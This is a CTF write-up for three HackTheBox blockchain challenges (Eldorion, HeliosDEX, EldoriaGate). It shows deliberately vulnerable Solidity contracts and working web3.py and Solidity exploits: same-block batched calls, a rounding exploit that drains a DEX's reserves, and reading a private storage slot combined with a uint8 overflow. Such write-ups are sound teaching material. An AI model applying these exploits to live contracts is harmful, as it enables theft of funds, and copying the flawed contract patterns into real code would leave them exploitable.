---
layout: post
title: "Cyber Apocalypse 2025: Blockchain Challenges"
date: 2025-03-27 00:00 +0000
categories: [HackTheBox, CTF]
tags: [blockchain, web3, python, solidity]
media_subpath: /images/htb_cyberapocalypse_2025/
image:
    path: banner.jpg
---
## Preface
This write-up contains the solutions to all the Blockchain challenges in the CTF hosted by HackTheBox [Cyber Apocalypse 2025: Tales from Eldoria](https://ctf.hackthebox.com/event/details/cyber-apocalypse-ctf-2025-tales-from-eldoria-2107), as well as my thought process in finding these solutions.

In all of these chalelnges, we are provided with the **.sol** files of the smart contracts deployed in the private Ethereum network, and by connecting to the spawned docker container using something like `nc`, our player address, our player private key, and the addresses of the setup and target contracts.

For solving the challenges, I decided to use web3.py for interacting with the contracts, and the [REMIX IDE](https://remix.ethereum.org/) for generating any needed ABIs.

In all these challenges the **Setup** contract contains the isSolved() function that dictates whether or not we can fetch the flag from the docker container.

## Eldorion
**Difficulty: Very Easy**

We begin with `Eldorion`, analyzing the structure of the **Eldorion.sol** file:
```
contract Eldorion {
    uint256 public health = 300;
    uint256 public lastAttackTimestamp;
    uint256 private constant MAX_HEALTH = 300;
    
    event EldorionDefeated(address slayer);
    
    modifier eternalResilience() {
        if (block.timestamp > lastAttackTimestamp) {
            health = MAX_HEALTH;
            lastAttackTimestamp = block.timestamp;
        }
        _;
    }
    
    function attack(uint256 damage) external eternalResilience {
        require(damage <= 100, "Mortals cannot strike harder than 100");
        require(health >= damage, "Overkill is wasteful");
        health -= damage;
        
        if (health == 0) {
            emit EldorionDefeated(msg.sender);
        }
    }
}
```
{: file="Eldorion.sol" }

From this, we can gather that the **Eldorion** has 300 starting and max health, we can only deal a maximum of 100 damage with each attack, and because of the eternalResilience modifier, every time we send a new transaction the `health` variable gets reset back to 300, since the `block.timestamp` can't be set by us.

In order to bypass this restriction, we have to send 3 concurrent attacks, but if we try using asynchronous function calls each transaction will still be processed individually.

The solution? Deploy our own contract that interacts with the `Eldorion` contract, making our 3 `attack` function calls belong to the same block, therefore having the same timestamp.

The **ExploitAttack.sol** file I used to achieve this:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "./Eldorion.sol";

contract ExploitAttack {
    Eldorion public target;

    constructor(address _target) {
        target = Eldorion(_target);
    }

    function tripleAttack() external {
        target.attack(100);
        target.attack(100);
        target.attack(100);
    }
}
```
{: file="ExploitAttack.sol" }

To deploy the contract I made this transaction:

```py
nonce = w3.eth.get_transaction_count(player_address)
transaction = ExploitAttack.constructor(eldorion_address).build_transaction({
    'chainId': w3.eth.chain_id,
    'gas': 2000000,
    'gasPrice': w3.to_wei('10', 'gwei'),
    'nonce': nonce,
})
signed_tx = w3.eth.account.sign_transaction(transaction, private_key=player_key)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
exploit_addr = tx_receipt.contractAddress
```

And to call the `tripleAttack` function I made this transaction:

```py
nonce += 1
transaction = exploit_contract.functions.tripleAttack().build_transaction({
    'chainId': w3.eth.chain_id,
    'gas': 200000,
    'gasPrice': w3.to_wei('10', 'gwei'),
    'nonce': nonce,
})
signed_txn = w3.eth.account.sign_transaction(transaction, private_key=player_key)
tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
```

After these steps, we can fetch the flag from the docker instance!

## HeliosDEX
**Difficulty: Easy**

To start this challenge, we'll look in a different direction and check the **Setup.sol** file:
```
contract Setup {
    HeliosDEX public TARGET;
    address public player;
    
    event DeployedTarget(address at);

    constructor(address _player) payable {
        TARGET = new HeliosDEX{value: 1000 ether}(1000);
        player = _player;
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return player.balance >= 20 ether;
    }
}
```
{: file="Setup.sol" }
From this contract, we can find our win condition which is having 20ETH in our wallet. We start with 12ETH , so right away I figured we had to add funds to our wallet somehow.

For our next step we analyze the target contract code, the **HeliosDEX.sol** file, this time in parts:
```
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";
<...>
contract HeliosDEX {
    uint256 public immutable exchangeRatioELD = 2;
    uint256 public immutable exchangeRatioMAL = 4;
    uint256 public immutable exchangeRatioHLS = 10;

    uint256 public immutable feeBps = 25;
    <...>
    bool public _tradeLock = false;

    constructor(uint256 initialSupplies) payable {
        eldorionFang = new EldorionFang(initialSupplies);
        malakarEssence = new MalakarEssence(initialSupplies);
        heliosLuminaShards = new HeliosLuminaShards(initialSupplies);
        reserveELD = initialSupplies;
        reserveMAL = initialSupplies;
        reserveHLS = initialSupplies;
    }
```
{: file="HeliosDEX.sol" }
This first part has the exchange ratios for each token, the flat fee in every transaction, the initial setup from which we can gather there are 1000 of each token, and, most importantly, a `_tradelock` variable that makes sure we don't swap ETH for tokens at the same time.

Moving on to the modifiers:
```
    modifier underHeliosEye {
        require(msg.value > 0, "HeliosDEX: Helios sees your empty hand! Only true offerings are worthy of a HeliosBarter");
        _;
    }

    modifier heliosGuardedTrade() {
        require(_tradeLock != true, "HeliosDEX: Helios shields this trade! Another transaction is already underway. Patience, traveler");
        _tradeLock = true;
        _;
        _tradeLock = false;
    }
```
{: file="HeliosDEX.sol" }
The modifiers are quite simple, the first one blocks us from trading 0 ETH for tokens, and the second one stops us from making concurrent transactions, using the variable discussed before.

Now the swap functions:
```
    function swapForELD() external payable underHeliosEye {
        uint256 grossELD = Math.mulDiv(msg.value, exchangeRatioELD, 1e18, Math.Rounding(0));
        uint256 fee = (grossELD * feeBps) / 10_000;
        uint256 netELD = grossELD - fee;

        require(netELD <= reserveELD, "HeliosDEX: Helios grieves that the ELD reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

        reserveELD -= netELD;
        eldorionFang.transfer(msg.sender, netELD);

        emit HeliosBarter(address(eldorionFang), msg.value, netELD);
    }

    function swapForMAL() external payable underHeliosEye {
        uint256 grossMal = Math.mulDiv(msg.value, exchangeRatioMAL, 1e18, Math.Rounding(1));
        <...>
    }

    function swapForHLS() external payable underHeliosEye {
        uint256 grossHLS = Math.mulDiv(msg.value, exchangeRatioHLS, 1e18, Math.Rounding(3));
    }
```
{: file="HeliosDEX.sol" }

> All these functions work exactly the same, so I omitted the duplicate code
{: .prompt-info }

Looking into the code of all of the swap functions, we can see the only thing that changes is the Rounding used. To understand the differences between rounding, we can check the Math.sol library that this contract imports from:

```
enum Rounding {
    Floor, // Toward negative infinity
    Ceil, // Toward positive infinity
    Trunc, // Toward zero
    Expand // Away from zero
}
```
{: file="Math.sol" }

We can associate each field to a number used, with 
- Rounding(0) = Floor
- Rounding(1) = Ceil
- Rounding(3) = Expand

Finally, the **oneTimeRefund** function:
```
    function oneTimeRefund(address item, uint256 amount) external heliosGuardedTrade {
        require(!hasRefunded[msg.sender], "HeliosDEX: refund already bestowed upon thee");
        require(amount > 0, "HeliosDEX: naught for naught is no trade. Offer substance, or be gone!");

        uint256 exchangeRatio;
        
        if (item == address(eldorionFang)) {
            exchangeRatio = exchangeRatioELD;
            require(eldorionFang.transferFrom(msg.sender, address(this), amount), "ELD transfer failed");
            reserveELD += amount;
        } else if (item == address(malakarEssence)) {
            exchangeRatio = exchangeRatioMAL;
            require(malakarEssence.transferFrom(msg.sender, address(this), amount), "MAL transfer failed");
            reserveMAL += amount;
        } else if (item == address(heliosLuminaShards)) {
            exchangeRatio = exchangeRatioHLS;
            require(heliosLuminaShards.transferFrom(msg.sender, address(this), amount), "HLS transfer failed");
            reserveHLS += amount;
        } else {
            revert("HeliosDEX: Helios descries forbidden offering");
        }

        uint256 grossEth = Math.mulDiv(amount, 1e18, exchangeRatio);

        uint256 fee = (grossEth * feeBps) / 10_000;
        uint256 netEth = grossEth - fee;

        hasRefunded[msg.sender] = true;
        payable(msg.sender).transfer(netEth);
        
        emit HeliosRefund(item, amount, netEth);
    }
}
```
{: file="HeliosDEX.sol" }
This function is a bit long, but, in essence, it just allows us to swap our previously acquired tokens back into ETH.

Having looked at all the code, we can clearly see the exploit in the use of Rounding, allowing us to swap very small amounts of ETH into a full token, and then refunding them all back to pass the challenge.

> In this process I chose to swap ETH for MAL since it had a better exchange ratio, but HLS should also work.
{: .prompt-tip }

We can use this function to buy all the MAL, using 1 wei per MAL:
```py
nonce = w3.eth.get_transaction_count(player_addr)

def buy_mal():
	global nonce

	transaction = heliosDEX.functions.swapForMAL().build_transaction({
		'from': player_addr,
		'chainId': w3.eth.chain_id,
		'value': w3.to_wei('1', 'wei'),
		'gas': 200000,
		'gasPrice': w3.to_wei('0.1', 'wei'),
		'nonce': nonce,
	})
	nonce += 1
	signed_tx = w3.eth.account.sign_transaction(transaction, player_key)
	tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
	return(tx_hash)
```

And we can just run a loop until we buy all the MAL!
```py
prev_wei_balance = w3.eth.get_balance(player_addr)
prev_mal_balance = malakar_essence.functions.balanceOf(player_addr).call()
print(f'Current Balance: {prev_mal_balance} MAL {w3.from_wei(prev_wei_balance, 'ether')} ETH')

while True:
	if get_reserve_mal() == 0:
		print("Finished buying all MAL")
		break
	tx_hash = buy_mal()
	print(f'Transaction hash: {tx_hash.hex()}')

post_wei_balance = w3.eth.get_balance(player_addr)
post_mal_balance = malakar_essence.functions.balanceOf(player_addr).call()
print(f'Current Balance: {post_mal_balance} MAL {w3.from_wei(post_wei_balance, 'ether')} ETH')
```

After the contract runs out of MAL reserves, we allow it to make transactions in our name, call the refund function and check our new balance:

```py
approve_tx = malakar_essence.functions.approve(helios_addr, post_mal_balance).build_transaction({
    'from': player_addr,
    'gas': 200000,
    'gasPrice': w3.to_wei('0.1', 'wei'),
    'nonce': nonce,
    })
nonce += 1
signed_approve_tx = w3.eth.account.sign_transaction(approve_tx, player_key)
approve_tx_hash = w3.eth.send_raw_transaction(signed_approve_tx.raw_transaction)

refund_tx = heliosDEX.functions.oneTimeRefund(malakar_essence_address, post_mal_balance).build_transaction({
    'from': player_addr,
    'gas': 200000,
    'gasPrice': w3.to_wei('0.1', 'wei'),
    'nonce': nonce
})
signed_refund_tx = w3.eth.account.sign_transaction(refund_tx, player_key)
refund_tx_hash = w3.eth.send_raw_transaction(signed_refund_tx.raw_transaction)

final_wei_balance = w3.eth.get_balance(player_addr)
final_mal_balance = malakar_essence.functions.balanceOf(player_addr).call()
print(f'Balance after Exchanging MAL: {final_mal_balance} MAL {w3.from_wei(final_wei_balance, 'ether')} ETH')
```

We once again connect to the docker instance and get the flag!

> Depleting the MAL reserves is not really necessary, but I didn't calculate the amount we'd get for the refund so I played it safe.
{: .prompt-info }

## EldoriaGate
**Difficulty: Medium**

We begin by analyzing the **Setup.sol** file:
```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

import { EldoriaGate } from "./EldoriaGate.sol";

contract Setup {
    EldoriaGate public TARGET;
    address public player;

    event DeployedTarget(address at);

    constructor(bytes4 _secret, address _player) {
        TARGET = new EldoriaGate(_secret);
        player = _player;
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public returns (bool) {
        return TARGET.checkUsurper(player);
    }
}
```
{: file="Setup.sol" }
We can see there's a `_secret` we're passing into **EldoriaGate**, and our win condition this time is becoming an Usurper (we'll get to that in a second), through the same contract.

Looking at the **EldoriaGate.sol** file:
```
<...>
import { EldoriaGateKernel } from "./EldoriaGateKernel.sol";

contract EldoriaGate {
    EldoriaGateKernel public kernel;

    event VillagerEntered(address villager, uint id, bool authenticated, string[] roles);
    event UsurperDetected(address villager, uint id, string alertMessage);
    
    struct Villager {
        uint id;
        bool authenticated;
        uint8 roles;
    }

    constructor(bytes4 _secret) {
        kernel = new EldoriaGateKernel(_secret);
    }
```
{: file="EldoriaGate.sol" }
We can see there's a Villager structure with an id, an authentication check, and a role, and that the **EldoriaGateKernel** is initialized with the same `_secret` variable from **Setup**.

Looking at the enter function:

```
    function enter(bytes4 passphrase) external payable {
        bool isAuthenticated = kernel.authenticate(msg.sender, passphrase);
        require(isAuthenticated, "Authentication failed");

        uint8 contribution = uint8(msg.value);        
        (uint villagerId, uint8 assignedRolesBitMask) = kernel.evaluateIdentity(msg.sender, contribution);
        string[] memory roles = getVillagerRoles(msg.sender);
        
        emit VillagerEntered(msg.sender, villagerId, isAuthenticated, roles);
    }
```
{: file="EldoriaGate.sol" }
It takes a `passphrase` as a parameter and checks if we're authenticated with it through the **kernel.authenticate** function.
It also takes the value of our transaction and checks our contribution, to assign us a role through the **kernel.evaluateIdentity** function.

> There is an additional function, `getVillagerRoles` but it only provides a list of available roles, so it isn't very relevant.
{: .prompt-info }

Moving on to the checkUsurper function:
```
    function checkUsurper(address _villager) external returns (bool) {
        (uint id, bool authenticated , uint8 rolesBitMask) = kernel.villagers(_villager);
        bool isUsurper = authenticated && (rolesBitMask == 0);
        emit UsurperDetected(
            _villager,
            id,
            "Intrusion to benefit from Eldoria, without society responsibilities, without suspicions, via gate breach."
        );
        return isUsurper;
    }
}
```
{: file="EldoriaGate.sol" }
From this function we can extract the logic behind becoming an usurper, which is either:
- being authenticated with no role
- not being authenticated but having a role

We'll try to make the first way work, but first we'll have to look at the main logic used to authenticate and assign roles in the **EldoriaGateKernel** contract file:

```
<...>
contract EldoriaGateKernel {
    bytes4 private eldoriaSecret;
    mapping(address => Villager) public villagers;
    address public frontend;

    uint8 public constant ROLE_SERF     = 1 << 0;
    uint8 public constant ROLE_PEASANT  = 1 << 1;
    uint8 public constant ROLE_ARTISAN  = 1 << 2;
    uint8 public constant ROLE_MERCHANT = 1 << 3;
    uint8 public constant ROLE_KNIGHT   = 1 << 4;
    uint8 public constant ROLE_BARON    = 1 << 5;
    uint8 public constant ROLE_EARL     = 1 << 6;
    uint8 public constant ROLE_DUKE     = 1 << 7;
```
{: file="EldoriaGateKernel.sol" }
In this initial snippet we can see the roles are all the `uint8` type, and that they're using bitshifts to the left.

In the next part of the contract file:
```
    <...>
    constructor(bytes4 _secret) {
        eldoriaSecret = _secret;
        frontend = msg.sender;
    }

    modifier onlyFrontend() {
        assembly {
            if iszero(eq(caller(), sload(frontend.slot))) {
                revert(0, 0)
            }
        }
        _;
    }
```
{: file="EldoriaGateKernel.sol" }
We can see the previous `_secret` is saved in the `eldoriaSecret` variable of the same type, and that the `frontend` variable is saved as the `msg.sender`, which is the address of the **EldoriaGate** contract.

The modifier **onlyFrontend** makes it so only the **EldoriaGate** contract can call functions this is attached to, preventing us from making any transactions with them. Next up, looking at the functions declared:
```
    function authenticate(address _unknown, bytes4 _passphrase) external onlyFrontend returns (bool auth) {
        assembly {
            let secret := sload(eldoriaSecret.slot)            
            auth := eq(shr(224, _passphrase), secret)
            mstore(0x80, auth)
            
            mstore(0x00, _unknown)
            mstore(0x20, villagers.slot)
            let villagerSlot := keccak256(0x00, 0x40)
            
            let packed := sload(add(villagerSlot, 1))
            auth := mload(0x80)
            let newPacked := or(and(packed, not(0xff)), auth)
            sstore(add(villagerSlot, 1), newPacked)
        }
    }
```
{: file="EldoriaGateKernel.sol" }

The **authenticate** function compares the first 4 bytes of the `passphrase` to the saved `secret`, and then stores the information in memory.

There is another function to look at, but let's focus on trying to get authenticated first.

To pass the check, we need to input the correct passphrase, but it's stored inside a private field so we can't fetch it in an usual way. Or is there?

Firstly, we have to understand that a **private** field in a smart contract only prevents other contracts from accessing the information, since as long as someone knows the slot where the value is stored then we can read it. Since the data is stored in sequential slots, our `secret` is stored in `slot 0`.

I recommend [this post](https://medium.com/coinmonks/how-to-read-private-variables-in-contract-storage-with-truffle-ethernaut-lvl-8-walkthrough-b2382741da9f) about how Ethereum Storage works by Nicole Zhu for a more in-depth explanation.

With this code snippet, we can fetch the secret and successfully authenticate:

```py
eldoria_gate_contract = w3.eth.contract(address=eldoriagate_addr, abi=eldoriagate_abi)
eldoria_gate_kernel_address = eldoria_gate_contract.functions.kernel().call()
secret_slot = 0
secret = w3.eth.get_storage_at(eldoria_gate_kernel_address, secret_slot)
passphrase_bytes = secret[-4:]
```

Since we only want 4 bytes, we discard the other 28. With this, we can call the enter function and authenticate successfully! Before that though, let's look at the next and final function of the **EldoriaGateKernel** contract:

```
    function evaluateIdentity(address _unknown, uint8 _contribution) external onlyFrontend returns (uint id, uint8 roles) {
        assembly {
            mstore(0x00, _unknown)
            mstore(0x20, villagers.slot)
            let villagerSlot := keccak256(0x00, 0x40)

            mstore(0x00, _unknown)
            id := keccak256(0x00, 0x20)
            sstore(villagerSlot, id)

            let storedPacked := sload(add(villagerSlot, 1))
            let storedAuth := and(storedPacked, 0xff)
            if iszero(storedAuth) { revert(0, 0) }

            let defaultRolesMask := ROLE_SERF
            roles := add(defaultRolesMask, _contribution)
            if lt(roles, defaultRolesMask) { revert(0, 0) }

            let packed := or(storedAuth, shl(8, roles))
            sstore(add(villagerSlot, 1), packed)
        }
    }
}
```
{: file="EldoriaGateKernel.sol" }

This function gives us a role, after making sure we are authenticated. Our goal is making sure our role is 0, but the default role is `SERF`, which equals to 1. At first glance, it seems like we can't exploit this function to grant us a role equal to 0, but let's focus on the **revert** instruction.

The **revert** instruction undos the transaction, returning us to our previous state, so, if this is called while we're not authenticated, it stops the **evaluateIdentity** function. Remembering the **enter** function in the **EldoriaGate** contract, this function is only called after it checks if we're authenticated through the keyword **require**, so this first **revert** will never trigger.

The second **revert**, however, will trigger if the role calculated from adding `defaultRolesMask` and `_contribution` is less than the `defaultRolesMask`. Since we know that the `_contribution` variable is the `msg.value` of the transaction, and that the `roles` variable in the `Villager` structure is of the type `uint8`, we can overflow this variable, making it's value 0, triggering the **revert**, and skipping the role assigning process, while still remaining authenticated!

Looking at this snippet:
```py
nonce = w3.eth.get_transaction_count(player_addr)
transaction = eldoria_gate_contract.functions.enter(passphrase_bytes).build_transaction({
    'from': player_addr,
    'chainId': w3.eth.chain_id,
    'value': w3.to_wei('255', 'wei'),
    'gas': 200000,
    'gasPrice': w3.to_wei('0', 'wei'),
    'nonce': nonce,
})
signed_tx = w3.eth.account.sign_transaction(transaction, player_key)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
```
We make a transaction to call the **enter** function with the correct passphrase fetched before, making sure the `value`is 255 wei, so that `msg.value` + `defaultRolesMask` (1) = 256. 

With this, we solved the challenge and we can fetch the flag from the docker container!

## Useful Resources

- [REMIX IDE](https://remix.ethereum.org)
- [web3.py Documentation](https://web3py.readthedocs.io/en/stable/)
- [Math.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/Math.sol)
- [A curated list of blockchain CTF writeups](https://github.com/blockthreat/blocksec-ctfs)
- [Ethereum Virtual Machine Opcodes](https://www.ethervm.io/)
